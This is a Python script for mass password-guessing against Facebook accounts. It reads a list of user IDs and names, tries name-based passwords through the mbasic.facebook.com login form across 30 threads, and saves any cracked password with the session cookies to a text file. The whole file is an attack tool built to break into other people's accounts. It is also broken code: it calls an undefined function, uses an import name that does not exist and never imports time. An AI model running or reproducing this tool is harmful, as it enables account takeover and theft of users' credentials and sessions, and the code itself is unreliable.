import requests,os,json,sys,random,uuid,re
from concurrent.futures import ThreadPoolExecutor as lol
from requests.exceptions import ConnectionError as CError
from bs4 import BeautifulSoup as parser
teer = ("|");idx = [];loop = 0;take_file = []
new_file = [];passwords = [];proxer = [];oku = []
cpu = [];tfu = []
G='\x1b[1;92m'
R='\x1b[1;91m'
W='\x1b[1;97m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
yp ='\x1b[1;95m'
C = '\x1b[0m' 

idx = []
p_ = ['first last','First Last','firstlast','first123','first1234','first12345','first@12','first@123','first@1234','first@12345','first12','first','First','2345678','234567','23456789']
oku = []
cpu = []
loop = 1

def menu():
    os.system('clear')
    file = input("file: ")
    for x in open(file,'r').readlines():
        idx.append(x.strip())
    print(47*'-')
    print('\t Version 1 .....')
    print(47*'-')
    with lol (max_workers=30) as send:
        for ids in idx:
            uid , nam = ids.rsplit("|")
            f = nam.rsplit(' ')[0]
            try:
                l = nam.rsplit(' ')[0]
            except(IOError,OSError,KeyError):
                l = f
            send.submit(check, uid,f,l)
    print(47*'-')
    print('cloning end use python filecloner.py relogin')
    print(47*'-')
    exit()
def basic(uid, f, l):
    global loop, cpu, oku
    sys.stdout.write('{}  [ {}/{} ] OK:{}\r'.format(C, str(loop), str(len(idx)), str(len(oku))))
    ses = requests.Session()
    url = "mbasic.facebook.com"

    for pw in p_:
        try:
            pw = pw.replace('first', f).replace('last', l).replace('First', f.capitalize()).replace('Last',
                                                                                                    l.capitalize())

            login_url = "https://{}/login/device-based/password/?uid={}&flow=login_no_pin&refsrc=deprecated&_rdr".format(
                url, uid)
            headers = {
                'Host': url,
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Java"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': f'https://{url}/login/device-based/',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-us'
            }

            response = ses.get(login_url, headers=headers).text
            soup = BeautifulSoup(response, "html.parser")
            form_action = soup.find("form", method="post").get("action")
            form_data = {_.get('name'): _.get('value') for _ in
                         soup.find('form', {'method': 'post'}).findAll('input', {'name': ['lsd', 'jazoest']})}

            form_data.update({
                'uid': uid,
                'next': f'https://{url}/login/save-device/',
                'flow': 'login_no_pin',
                'encpass': '#PWD_BROWSER:0:{}:{}'.format(random.randint(1111111111, 9999999999), pw),
                'submit': 'Log in'
            })

            post_url = "https://{}{}".format(url, form_action)
            headers['Referer'] = login_url
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            response = ses.post(post_url, data=form_data, headers=headers, allow_redirects=False)

            if "c_user" in ses.cookies.get_dict():
                print("\r {} [Mr-saifii-ok] {} {}".format(G, uid, C))
                try:
                    coki = ';'.join(["%s=%s" % (k, v) for k, v in ses.cookies.get_dict().items()])
                except:
                    coki = 'no'
                oku.append(uid)
                url_str = str(uid)
                idz = url_str + teer + pw + teer + coki + '\n'
                open('ids_original_pass.txt', 'a').write(idz)

            elif "checkpoint" in ses.cookies.get_dict():
                break
            else:
                continue
        except Exception as e:
            time.sleep(10)
            continue
    loop += 1

menu()
